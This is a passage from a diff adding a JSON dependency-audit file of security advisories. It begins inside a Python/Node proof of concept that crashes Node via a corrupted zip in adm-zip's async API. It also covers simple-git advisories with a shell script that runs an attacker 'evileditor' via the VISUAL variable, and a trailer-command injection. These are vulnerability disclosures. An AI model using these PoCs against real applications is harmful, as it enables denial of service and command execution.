crashed by a single malicious zip file,\n  with no authentication and no special privileges required.\n\nReproduction:\n  1. Install: this PoC runs directly against the adm-zip source tree this\n     script lives alongside (no `npm install` needed -- it requires the\n     local checkout via its package.json \"main\" entry, adm-zip.js).\n     Requires: python3, node (tested with Node.js v22.22.1).\n  2. Run: python3 poc_async_dos.py\n  3. Observe: the spawned Node child process exits non-zero with an\n     \"Unhandled 'error' event\" / Z_DATA_ERROR stack trace on stderr,\n     originating from methods/inflater.js's zlib.createInflateRaw stream.\n     Neither the harness's try/catch nor the getDataAsync callback ever\n     fires -- proving the crash is unrecoverable from calling code.\n\nHow the malicious zip is built (see the embedded Node harness in\nbuild_harness_script() below):\n  1. Use adm-zip's own writer (`new AdmZip(); zip.addFile(...); zip.toBuffer()`)\n     to produce a fully valid, well-formed zip archive with one DEFLATE\n     entry. This guarantees every header/CRC/offset field is structurally\n     correct.\n  2. Locate the local file header at offset 0 and compute the compressed\n     data region from the (untouched) LOCSIZ/LOCNAM/LOCEXT fields.\n  3. XOR every byte in that region with 0xFF, corrupting ONLY the DEFLATE\n     payload while leaving every size/offset/CRC field in the local header,\n     central directory, and EOCD record byte-for-byte unchanged, so\n     adm-zip's own parser still locates and slices exactly the right\n     region and reaches the vulnerable inflateAsync() call.\n\"\"\"\n\nimport os\nimport subprocess\nimport sys\nimport tempfile\n\n# ============================================================\n# Configuration\n# ============================================================\nPACKAGE_NAME = \"adm-zip\"\nTARGET_VERSION = \"0.6.0\"\n# The adm-zip source tree this PoC lives alongside (Hunter's checkout).\nREPO_DIR = os.path.dirname(os.path.abspath(__file__))\nNODE_BIN = \"node\"\nSUBPROCESS_TIMEOUT_SECONDS = 20\n\n\n# ============================================================\n# Node.js harness (the genuine trigger -- adm-zip is a JS library, so the\n# actual exploit code must run under Node; this Python script builds it,\n# runs it in an isolated child process, and interprets the result).\n# ============================================================\ndef build_harness_script(repo_dir: str) -> str:\n    return r\"\"\"\n\"use strict\";\nconst AdmZip = require(%(repo_dir)r);\n\nconsole.log(\"HARNESS_START\");\n\n// Step 1: build a legitimate zip in memory using adm-zip's OWN writer, with\n// one DEFLATE-compressed entry. Repetitive text compresses well and\n// guarantees the DEFLATED method is chosen (not STORED).\nconst zip = new AdmZip();\nconst payload = Buffer.from(\n    \"The quick brown fox jumps over the lazy dog. \".repeat(200),\n    \"utf8\"\n);\nzip.addFile(\"payload.txt\", payload, \"\");\nconst goodBuf = zip.toBuffer();\nconsole.log(\"BUILT_GOOD_ZIP bytes=\" + goodBuf.length);\n\n// Step 2: locate the local file header (offset 0 in this single-entry\n// archive) and corrupt ONLY the compressed-data bytes in place, leaving\n// every size/offset/CRC field in the local header, central directory, and\n// EOCD record untouched -- so adm-zip's own parser still finds and slices\n// exactly the right region and reaches the vulnerable inflateAsync() path.\nconst LOCSIG = 0x04034b50;\nif (goodBuf.readUInt32LE(0) !== LOCSIG) {\n    throw new Error(\"unexpected local header signature -- adm-zip writer output changed\");\n}\nconst compressedSize = goodBuf.readUInt32LE(18); // LOCSIZ\nconst fileNameLen = goodBuf.readUInt16LE(26); // LOCNAM\nconst extraLen = goodBuf.readUInt16LE(28); // LOCEXT\nconst dataStart = 30 + fileNameLen + extraLen;\nconst dataEnd = dataStart + compressedSize;\nconsole.log(\n    \"LOCAL_HEADER compressedSize=\" + compressedSize +\n    \" dataStart=\" + dataStart + \" dataEnd=\" + dataEnd\n);\n\nconst badBuf = Buffer.from(goodBuf); // copy, do not mutate original\nfor (let i = dataStart; i < dataEnd; i++) {\n    badBuf[i] = badBuf[i] ^ 0xff; // corrupt every byte of the DEFLATE stream\n}\nconsole.log(\"CORRUPTED_COMPRESSED_BYTES count=\" + (dataEnd - dataStart));\n\n// Step 3: parse the corrupted archive (this succeeds -- headers are intact)\n// and hit the vulnerable async decompression path.\nconst zip2 = new AdmZip(badBuf);\nconst entries = zip2.getEntries();\nconsole.log(\n    \"PARSED_CORRUPT_ZIP entries=\" + entries.length +\n    \" name=\" + entries[0].entryName\n);\n\ntry {\n    // This is the public, documented API a real server would call on an\n    // untrusted upload (readFileAsync / getDataAsync / extractAllToAsync\n    // all funnel into the same decompress(true, ...) -> inflateAsync path).\n    entries[0].getDataAsync(function (data, err) {\n        // If this ever fires, the library handled the error gracefully\n        // (no crash) -- meaning the vulnerability is NOT present / already\n        // fixed in this build.\n        console.log(\n            \"CALLBACK_FIRED data_len=\" + (data ? data.length : 0) +\n            \" err=\" + err\n        );\n    });\n    console.log(\"SYNC_CALL_RETURNED_NO_THROW\");\n} catch (e) {\n    // If this ever fires, the bug is NOT present -- the error would be\n    // synchronously catchable by ordinary calling code.\n    console.log(\"CAUGHT_BY_TRY_CATCH: \" + e.message);\n}\n\nconsole.log(\"HARNESS_END_OF_SYNCHRONOUS_CODE\");\n// Deliberately NOT registering process.on(\"uncaughtException\", ...) here --\n// doing so would mask the exact bug under test. A real, unmodified server\n// process has no reason to install a blanket uncaughtException handler\n// either; that is precisely what makes this an unrecoverable process crash.\n\"\"\" % {\"repo_dir\": repo_dir}\n\n\n# ============================================================\n# Step 1: Setup\n# ============================================================\ndef setup():\n    \"\"\"Verify prerequisites and write out the Node.js harness script.\"\"\"\n    print(f\"[*] Setting up PoC for {PACKAGE_NAME}@{TARGET_VERSION}\")\n    print(f\"[*] Target adm-zip source tree: {REPO_DIR}\")\n\n    main_entry = os.path.join(REPO_DIR, \"adm-zip.js\")\n    if not os.path.isfile(main_entry):\n        print(f\"[-] Cannot find adm-zip.js at {main_entry}\")\n        sys.exit(1)\n\n    try:\n        node_version = subprocess.run(\n            [NODE_BIN, \"--version\"], capture_output=True, text=True, timeout=10\n        )\n        print(f\"[*] Found Node.js: {node_version.stdout.strip()}\")\n    except FileNotFoundError:\n        print(\"[-] node binary not found on PATH -- required to run this PoC\")\n        sys.exit(1)\n\n    handle, harness_path = tempfile.mkstemp(prefix=\"admzip_async_dos_\", suffix=\".js\")\n    with os.fdopen(handle, \"w\") as f:\n        f.write(build_harness_script(REPO_DIR))\n    print(f\"[*] Wrote Node harness to {harness_path}\")\n    return harness_path\n\n\n# ============================================================\n# Step 2: Trigger the vulnerability\n# ============================================================\ndef trigger(harness_path):\n    \"\"\"Run the Node harness (in its own isolated child process) that builds\n    the malicious zip and feeds it into adm-zip's vulnerable async API.\"\"\"\n    print(\"[*] Triggering vulnerability (spawning isolated Node subprocess)...\")\n    try:\n        proc = subprocess.run(\n            [NODE_BIN, harness_path],\n            capture_output=True,\n            text=True,\n            timeout=SUBPROCESS_TIMEOUT_SECONDS,\n            cwd=REPO_DIR,\n        )\n        return {\n            \"timed_out\": False,\n            \"returncode\": proc.returncode,\n            \"stdout\": proc.stdout,\n            \"stderr\": proc.stderr,\n        }\n    except subprocess.TimeoutExpired as e:\n        return {\n            \"timed_out\": True,\n            \"returncode\": None,\n            \"stdout\": (e.stdout or b\"\").decode(errors=\"replace\") if isinstance(e.stdout, bytes) else (e.stdout or \"\"),\n            \"stderr\": (e.stderr or b\"\").decode(errors=\"replace\") if isinstance(e.stderr, bytes) else (e.stderr or \"\"),\n        }\n\n\n# ============================================================\n# Step 3: Verify impact\n# ============================================================\ndef verify(result):\n    \"\"\"Check that the child process crashed with an unhandled 'error' event\n    originating from the async inflater, and that neither the try/catch nor\n    the getDataAsync callback in the harness ever ran.\"\"\"\n    print(\"[*] Verifying impact...\")\n    print(f\"[*] Child process exit code: {result['returncode']}\")\n    print()\n    print(\"----- Node child process stdout -----\")\n    print(result[\"stdout\"].rstrip())\n    print(\"----- Node child process stderr (crash evidence) -----\")\n    print(result[\"stderr\"].rstrip())\n    print(\"--------------------------------------\")\n    print()\n\n    if result[\"timed_out\"]:\n        print(\"[-] Harness timed out instead of crashing -- inconclusive\")\n        return False\n\n    stdout = result[\"stdout\"]\n    stderr = result[\"stderr\"]\n    returncode = result[\"returncode\"]\n\n    reached_vuln_call = \"SYNC_CALL_RETURNED_NO_THROW\" in stdout\n    was_caught = \"CAUGHT_BY_TRY_CATCH\" in stdout\n    callback_fired = \"CALLBACK_FIRED\" in stdout\n    process_crashed = returncode is not None and returncode != 0\n    unhandled_error_evidence = (\n        \"Unhandled 'error' event\" in stderr\n        or \"ERR_UNHANDLED_ERROR\" in stderr\n        or \"Emitted 'error' event on InflateRaw instance\" in stderr\n    )\n\n    print(f\"[*] Reached vulnerable getDataAsync() call without throwing: {reached_vuln_call}\")\n    print(f\"[*] Caught by harness's own try/catch (would mean NOT vulnerable): {was_caught}\")\n    print(f\"[*] getDataAsync callback ever fired (would mean NOT vulnerable): {callback_fired}\")\n    print(f\"[*] Child process exited non-zero (crashed): {process_crashed}\")\n    print(f\"[*] stderr shows an unhandled 'error' event from the InflateRaw stream: {unhandled_error_evidence}\")\n\n    success = (\n        reached_vuln_call\n        and not was_caught\n        and not callback_fired\n        and process_crashed\n        and unhandled_error_evidence\n    )\n    return success\n\n\n# ============================================================\n# Main\n# ============================================================\nif __name__ == \"__main__\":\n    print(f\"=== CVE-CANDIDATE: {PACKAGE_NAME} async decompression DoS ===\")\n    print(f\"[*] Target version: {TARGET_VERSION}\")\n    print()\n\n    harness_path = setup()\n    try:\n        result = trigger(harness_path)\n        success = verify(result)\n    finally:\n        try:\n            os.remove(harness_path)\n            print(f\"[*] Cleaned up temp harness file: {harness_path}\")\n        except OSError:\n            pass\n\n    print()\n    if success:\n        print(\"[+] VULNERABILITY CONFIRMED\")\n        print(\n            \"[+] Impact: a single untrusted zip file with a corrupted DEFLATE \"\n            \"entry crashes the entire Node.js process when read via any \"\n            \"adm-zip *Async API (readFileAsync / readAsTextAsync / \"\n            \"extractAllToAsync / ZipEntry.getDataAsync). Unauthenticated, \"\n            \"single-request, unrecoverable process-level Denial of Service.\"\n        )\n    else:\n        print(\"[-] Vulnerability NOT confirmed\")\n\n    sys.exit(0 if success else 1)\n```",
+      "reported_by": null,
+      "title": "adm-zip: Unhandled error event in async DEFLATE decompression crashes Node.js process (DoS)",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<=0.6.0",
+      "github_advisory_id": "GHSA-8238-w5pm-2374",
+      "recommendation": "Upgrade to version 0.6.1 or later",
+      "patched_versions": ">=0.6.1",
+      "updated": "2026-09-29T23:10:11.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-8238-w5pm-2374"
+    },
+    "1241198": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            "apps__macos>node-llama-cpp>simple-git>@simple-git/argv-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/steveukx/git-js/security/advisories/GHSA-v5rq-49vh-5v5c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102829\n- https://github.com/steveukx/git-js/pull/1201\n- https://github.com/steveukx/git-js/commit/68874c239f0c7a87f4a68c3d2c4a0d7c75bb27f4\n- https://github.com/steveukx/git-js/releases/tag/@simple-git/argv-parser@2.0.1\n- https://github.com/advisories/GHSA-v5rq-49vh-5v5c",
+      "created": "2026-10-05T23:48:21.000Z",
+      "id": 1241198,
+      "npm_advisory_id": null,
+      "overview": "# Security control bypass in `@simple-git/argv-parser`: Git's `VISUAL` editor fallback is not classified as `allowUnsafeEditor`\n\n## Report metadata\n\n| Field | Value |\n| --- | --- |\n| Package | `@simple-git/argv-parser` (npm, `pkg:npm/%40simple-git/argv-parser`) |\n| Repository | https://github.com/steveukx/git-js |\n| Component | `parseEnv` (`packages/argv-parser/src/env/parse-env.ts`), reached via `vulnerabilityCheck(tokens, env)` |\n| Vulnerability class | Security-control bypass — incomplete denylist in unsafe-editor detection |\n| Verified against | `c427fbad33f1f2b11341f1cf852eedecbb106400` (`@simple-git/argv-parser` 1.1.1), plus the published npm artifact 1.1.1; `main` at `98864c6` observed still unpatched |\n| API surface | Public documented API (`parseEnv(raw)` / `vulnerabilityCheck(tokens, env)`) |\n| Affected in default configuration | Yes — reproduced with `blockUnsafeOperationsPlugin` under default options, with no unsafe allowances enabled |\n\n## Summary\n\n`GitEnvKeys` in `packages/argv-parser/src/env/parse-env.ts` maps only `editor`, `git_editor` and `git_sequence_editor` to the `allowUnsafeEditor` category. `prepareEnv` keeps an environment entry only when its lowercased name is a known `GitEnvKey` or starts with `git`, so `VISUAL` is discarded before `collectConfigVulnerabilities` ever inspects it. Git, however, falls back to `VISUAL` when resolving an editor, so `parseEnv({ VISUAL: '/tmp/evileditor' })` reports no vulnerability while an interactive Git operation will execute that binary.\n\nIn a consuming application the shape is: environment values derived from a request or job are forwarded into the child Git environment and classified by this parser before spawn. The parser exists to classify exactly such values, and the equivalent `EDITOR` or `GIT_EDITOR` value is rejected — so the attacker gains an editor substitution that the guard is specifically designed to block.\n\n- `EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `GIT_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `GIT_SEQUENCE_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `VISUAL` -> **absent from `GitEnvKeys`; dropped by `prepareEnv`, lines 60-68 — no vulnerability emitted**\n\n## Impact\n\nA consuming application that allows attacker-influenced environment values can have an attacker-selected executable launched by Git during operations such as `git commit --amend`, bypassing the parser's default unsafe-editor protection. Execution happens as the host user running the Git child process, with the attacker's binary invoked against the repository's editor file (for example `.git/COMMIT_EDITMSG`, or `.git/rebase-merge/git-rebase-todo` for `git rebase -i`).\n\nThe new capability is the bypass itself: without this gap, the same attacker-supplied value under `EDITOR`, `GIT_EDITOR` or `GIT_SEQUENCE_EDITOR` is refused unless the consumer explicitly opts in to `allowUnsafeEditor`. With `VISUAL`, the equivalent code execution proceeds with no opt-in and no reported vulnerability. `VISUAL` also takes precedence over `EDITOR`, the variable the parser does flag.\n\nScoring note: no CVSS vector or score is available for this finding, and one is not asserted here. Exploitability depends on the consuming application's data flow — specifically whether attacker-influenced environment entries reach the Git child environment. Consumers that never forward untrusted environment values into Git, or that always set a higher-priority `GIT_EDITOR` or `core.editor`, are not affected.\n\n## Preconditions\n\n1. The consumer forwards attacker-influenced environment entries into the environment passed to child Git (for example via simple-git's `.env()`), and classifies them with this parser before spawn.\n2. The Git command opens an editor — for example `commit` without `-m`, `commit --amend`, or `rebase -i`.\n3. No higher-priority editor setting overrides `VISUAL`: `GIT_EDITOR`, `core.editor` and `EDITOR` are absent (`GIT_EDITOR` and `core.editor` take precedence; `VISUAL` itself overrides `EDITOR`).\n4. `TERM` is set to a value other than exactly `dumb` — Git consults `VISUAL` only then. `TERM` is neither a `GitEnvKey` nor `git`-prefixed, so an attacker who controls the environment object supplies it too and the parser reports nothing for it either.\n5. The attacker-selected executable exists and is runnable on the host.\n\nThis requires no non-standard usage, no monkey-patching and no unusual configuration: the affected path is the documented, default-enabled guard. `docs/PLUGIN-UNSAFE-ACTIONS.md` (\"Text editor\") documents this control as covering editor environment variables that substitute an arbitrary binary, but lists only `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`; Git's `VISUAL` fallback is not mentioned, and the string `visual` does not appear anywhere in the repository at the verified commit. The docs do state that supplying environment values is the caller's responsibility, but they do not warn that `VISUAL` is outside the guard.\n\nThe feed payload's precondition list also carries entries relating to a separate `GIT_CONFIG_PARAMETERS` / `allowUnsafeConfigEnvCount` config-injection scenario. Those were not needed here: the bypass was reproduced with default options and no unsafe allowances enabled.\n\n## Data flow\n\n1. **Source** — the attacker-influenced `raw` environment object enters the public parser entry point: `parseEnv(raw)` ([`packages/argv-parser/src/env/parse-env.ts:70`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L70)).\n2. **Propagation** — `prepareEnv` lowercases keys and retains only known `GitEnvKeys` or names starting with `git`; `visual` is neither, so the entry is dropped before any analysis sees it ([`packages/argv-parser/src/env/parse-env.ts:60-68`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L60-L68)).\n3. **Sink** — `collectConfigVulnerabilities` therefore never emits `allowUnsafeEditor` for `VISUAL`, and `vulnerabilityCheck(tokens, env)` returns an empty list ([`packages/argv-parser/src/env/parse-env.ts:45-54`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L45-L54)).\n4. **Reachability** — simple-git's `blockUnsafeOperationsPlugin` passes its environment into `vulnerabilityCheck` before spawn; an empty vulnerability list means the Git child process is allowed to start ([`simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts:12-20`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts#L12-L20)).\n\n## Vulnerable code\n\n`packages/argv-parser/src/env/parse-env.ts`, lines 5-27 at `c427fbad33f1f2b11341f1cf852eedecbb106400`:\n\n```ts\nconst GitEnvKeys = {\n   'editor': 'allowUnsafeEditor',\n   // ...\n   'git_editor': 'allowUnsafeEditor',\n   // ...\n   'git_sequence_editor': 'allowUnsafeEditor',\n   // VISUAL missing\n} as const satisfies Record<string, VulnerabilityCategory>;\n```\n\nThe three mapped keys are the safe siblings; the missing `visual` entry is the gap. Because `prepareEnv` (lines 60-68) filters on this map plus a `git` prefix, the omission is not merely a missing classification — the value never reaches the classifier at all.\n\n## Reproduction\n\n**Verified** — reproduced dynamically, end to end, against a checkout of `c427fbad33f1f2b11341f1cf852eedecbb106400` (`packages/argv-parser/package.json` = 1.1.1) and against the published npm artifact 1.1.1.\n\nObserved at the parser level (vitest PoC run against the repo):\n\n- `parseEnv({ EDITOR })`, `parseEnv({ GIT_EDITOR })` and `parseEnv({ GIT_SEQUENCE_EDITOR })` each yield one `allowUnsafeEditor` vulnerability.\n- `parseEnv({ VISUAL: '/tmp/poc/evileditor' })` yields `[]` in every casing.\n- `vulnerabilityCheck(['commit', '--amend'], { VISUAL })` — the exact call the spawn guard makes — returns `[]`.\n- The published `dist/index.cjs` of 1.1.1 contains zero occurrences of `visual`; the same holds for the repository at the verified commit, including `docs/PLUGIN-UNSAFE-ACTIONS.md`.\n\nObserved at the Git level (only `VISUAL` set, `EDITOR` and `GIT_EDITOR` unset): `git var GIT_EDITOR` returned the attacker path; `git commit --amend` executed the attacker script (marker written, commit subject rewritten); `git rebase -i` executed it for the rebase-todo as well. `VISUAL` also took precedence over `EDITOR` (`EDITOR=/bin/true VISUAL=evil` -> `evil`).\n\nObserved end to end through the real spawn path (simple-git built from this commit, default options, no unsafe allowances): the `EDITOR` and `GIT_EDITOR` variants both threw `GitPluginError` — \"Use of ... is not permitted without enabling allowUnsafeEditor\" — with no execution. The `VISUAL` variant was **not** blocked: the plugin saw an empty vulnerability list, Git spawned, and the attacker-supplied editor executed as the host user against `.git/COMMIT_EDITMSG`, rewriting the commit message.\n\nMinimal Git-level reproduction:\n\n```sh\n#!/bin/sh\nset -e\nrm -rf /tmp/visual-repo /tmp/GIT_VISUAL_POC /tmp/evileditor\nmkdir /tmp/visual-repo && cd /tmp/visual-repo\ngit init -q\ngit config user.email a@a && git config user.name a\ntouch a && git add a && git commit -qm init\nprintf '#!/bin/sh\\ntouch /tmp/GIT_VISUAL_POC\\nexit 1\\n' >/tmp/evileditor\nchmod +x /tmp/evileditor\nenv -u EDITOR -u GIT_EDITOR VISUAL=/tmp/evileditor git commit --amend || true\ntest -e /tmp/GIT_VISUAL_POC && echo executed\n```\n\nGuard-level reproduction, using the public API:\n\n```ts\nimport { vulnerabilityCheck } from '@simple-git/argv-parser';\nimport { spawnSync } from 'node:child_process';\nconst args = ['commit', '--amend'];\nconst env = { VISUAL: '/tmp/evileditor' };\nif (vulnerabilityCheck(args, env).length === 0) spawnSync('git', args, { env });\n```\n\n- **Expected:** `parseEnv({ VISUAL: '/tmp/evileditor' }).vulnerabilities` contains `allowUnsafeEditor`, and the spawn guard refuses the operation unless the consumer has enabled `allowUnsafeEditor` — the behaviour already applied to `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`.\n- **Actual:** no vulnerability is reported, the guard permits the spawn, and Git executes the attacker-selected binary.\n\n## Suggested remediation\n\nTreat `VISUAL` as an editor source, so Git's own editor-resolution precedence is fully covered by the denylist.\n\n```ts\nconst GitEnvKeys = {\n   'editor': 'allowUnsafeEditor',\n   'visual': 'allowUnsafeEditor',\n   // ...\n   'git_editor': 'allowUnsafeEditor',\n   // ...\n   'git_sequence_editor': 'allowUnsafeEditor',\n} as const satisfies Record<string, VulnerabilityCategory>;\n```\n\nBecause `prepareEnv` filters on `GitEnvKeys` membership, this single entry is enough to make `visual` survive filtering and be classified; no change to `prepareEnv` or `collectConfigVulnerabilities` is required.\n\nNotes:\n\n- `TERM` is likewise neither a `GitEnvKey` nor `git`-prefixed, and it is the variable that decides whether Git consults `VISUAL` at all (`TERM=dumb` or unset means `VISUAL` is ignored). An attacker who controls the environment object supplies it alongside `VISUAL`; whether `TERM` warrants its own classification is a maintainer judgement call, but it is worth considering while fixing this.\n- `git rebase -i` reaches the same sink: `git_sequence_editor` falls back to normal editor resolution, so the `VISUAL` path executes the attacker binary against the rebase-todo file as well.\n- `docs/PLUGIN-UNSAFE-ACTIONS.md` (\"Text editor\") should list `VISUAL` alongside `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR`, since the documented scope of the control is what consumers rely on.\n- Already safe and needing no change: `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR` are all correctly classified and enforced by the plugin, and the parser's handling of `git`-prefixed variables is unaffected.\n\nSuggested regression test alongside `test/parse-env.spec.ts` (which currently covers `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR` / `PAGER` but has no `VISUAL` case): assert that `parseEnv({ VISUAL: '/tmp/evileditor' })` yields one `allowUnsafeEditor` vulnerability in every casing, and that `vulnerabilityCheck(['commit', '--amend'], { VISUAL: '/tmp/evileditor' })` returns that vulnerability rather than `[]`. A precedence case is worth adding too: `VISUAL` set together with `EDITOR` must still be flagged, since `VISUAL` wins in Git's resolution order.",
+      "reported_by": null,
+      "title": "simple-git: `VISUAL` editor environment variable is omitted from unsafe editor detection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102829"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "@simple-git/argv-parser",
+      "vulnerable_versions": "<2.0.1",
+      "github_advisory_id": "GHSA-v5rq-49vh-5v5c",
+      "recommendation": "Upgrade to version 2.0.1 or later",
+      "patched_versions": ">=2.0.1",
+      "updated": "2026-10-05T23:48:22.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78",
+        "CWE-184"
+      ],
+      "url": "https://github.com/advisories/GHSA-v5rq-49vh-5v5c"
+    },
+    "1241199": {
+      "findings": [
+        {
+          "version": "3.36.0",
+          "paths": [
+            "apps__macos>node-llama-cpp>simple-git"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/steveukx/git-js/security/advisories/GHSA-x6jw-m9v5-85vh\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102828\n- https://github.com/steveukx/git-js/pull/1198\n- https://github.com/steveukx/git-js/commit/d762810c13b331ff1e5eb24c0b434646d2a8d1b3\n- https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.1\n- https://github.com/advisories/GHSA-x6jw-m9v5-85vh",
+      "created": "2026-10-05T23:48:14.000Z",
+      "id": 1241199,
+      "npm_advisory_id": null,
+      "overview": "## Affected product\n\nThe default `blockUnsafeOperationsPlugin` in `simple-git` when an application permits untrusted values to reach `SimpleGitOptions.config` or Git inline configuration arguments such as `-c <key>=<value>`.\n\n## Summary\n\n`trailer.<token>.cmd` is not recognized as unsafe by the default guard. Therefore, a configured inline value reaches Git without a `GitPluginError`.\n\nGit documents `trailer.<token>.cmd` as a shell command invoked by `git interpret-trailers`. An application that relies on the default plugin to reject unsafe configuration can therefore execute a command supplied through an untrusted trailer-command configuration value.\n\n## Technical details\n\n`simple-git/src/lib/git-factory.ts` installs `commandConfigPrefixingPlugin` before `blockUnsafeOperationsPlugin`. The prefixing plugin in `simple-git/src/lib/plugins/command-config-prefixing-plugin.ts` turns every `SimpleGitOptions.config` entry into `-c <key>=<value>` before the unsafe-operation plugin evaluates the final argv.\n\nIn `simple-git@3.36.0`, `blockUnsafeOperationsPlugin` delegates to `@simple-git/argv-parser`. `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts` compares parsed configuration writes against `preventUnsafeConfig`. That list has no matcher for `trailer.<token>.cmd`, so the invocation is allowed.\n\nGit v2.39.5's `Documentation/git-interpret-trailers.txt` states that `trailer.<token>.cmd` specifies a shell command called to generate or modify a trailer.\n\n## Preconditions\n\nThe application must use an affected `simple-git` version with the default unsafe-operation plugin active and must pass attacker-controlled data into instance configuration or Git command arguments that configure `trailer.<token>.cmd`.\n\nThe invoked Git binary must support the documented trailer-command behavior, and the application must execute `git interpret-trailers` with the attacker-controlled configuration in scope. The command runs with the operating-system identity and permissions of the Node.js process.\n\n## Verification\n\nUse an isolated test environment and a harmless executable test helper that records only its invocation.\n\n**Control:** Configure `core.editor=<test-helper>` through `SimpleGitOptions.config` and invoke a benign Git task. The default plugin should throw `GitPluginError` before spawning Git because `core.editor` is present in `preventUnsafeConfig`.\n\n**Bypass:** Configure `trailer.audit.cmd=<test-helper>` through the same option and invoke Git with the equivalent argv shape:\n\n`git -c trailer.audit.cmd=<test-helper> interpret-trailers --trailer audit:<value> <input-file>`\n\nA vulnerable build does not raise `GitPluginError`; Git invokes the test helper while processing the trailer. Confirm the helper invocation, then remove test artifacts.\n\n## Impact\n\nAn attacker who controls the stated configuration input can cause Git to execute a shell command as the Node.js application process. The impact is bounded by that process's filesystem, network, and service permissions. Applications that do not expose untrusted configuration or command arguments to `simple-git` are outside this threat model.\n\n## Affected versions\n\nCommit `6b3c631eadea81f80ed10f6dec7d19a9db4d7084` introduced the default unsafe-operation plugin, and `simple-git@3.15.0` is the first release confirmed to contain it. Its implementation only rejected `protocol.allow` configuration, leaving trailer-command configuration unblocked.\n\nThe latest `simple-git` release, `3.36.0`, still lacks a trailer-command matcher. The current `main` branch also lacks one. No released remediation was identified.\n\n## Remediation\n\nDefault-deny configuration keys that can trigger executable behavior, or add a dedicated unsafe category that rejects `trailer.<token>.cmd` before spawning Git unless the application explicitly opts in.\n\nEvaluate `trailer.<token>.command` alongside `.cmd`, because Git documents it as related command behavior. Add parser and integration tests for leading `-c`, configured instance prefixes, and `git config` write forms, asserting that no Git child process is spawned without an explicit unsafe opt-in.\n\n## Evidence\n\n- `simple-git@3.15.0` was released on 2022-11-12 and contains the initial unsafe-operation plugin.\n- `simple-git@3.36.0` was released on 2026-04-12; its parser source does not match `trailer.<token>.cmd`.\n- `main` retains the missing matcher in `packages/argv-parser/src/vulnerabilities/detect-vulnerable-config-writes.ts`.\n- Git v2.39.5 documents the trailer command behavior in `Documentation/git-interpret-trailers.txt`.\n- PR #1167 expanded other configuration checks but did not add a trailer-command matcher and is not release-backed as a remediation.\n- This review verified repository, release, and source artifacts through GitHub; it did not independently execute the runtime reproduction.",
+      "reported_by": null,
+      "title": "simple-git unsafe-operation guard does not block trailer command configuration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-102828"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "simple-git",
+      "vulnerable_versions": ">=3.15.0 <4.0.1",
+      "github_advisory_id": "GHSA-x6jw-m9v5-85vh",
+      "recommendation": "Upgrade to version 4.0.1 or later",
+      "patched_versions": ">=4.0.1",
+      "updated": "2026-10-05T23:48:14.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78",
+        "CWE-184"
+      ],
+      "url": "https://github.com/advisories/GHSA-x6jw-m9v5-85vh"
+    },
+    "1241200": {
+      "findings": [
+        {
+          "version": "3.36.0",
+          "paths": [
+            "apps__macos>node-llama-cpp>simple-git"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/steveukx/git-js/security/advisories/GHSA-g4wm-2vf7-vfgr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-102826\n- https://github.com/steveukx/git-js/pull/1193\n- https://github.com/steveukx/git-js/commit/98864c678444d9336357c844efa4fd5a7984c0d7\n- https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.0\n- https://github.com/advisories/GHSA-g4wm-2vf7-vfgr",
+      "created": "2026-10-05T23:48:05.000Z",
+      "id": 1241200,
+      "npm_advisory_id": null,
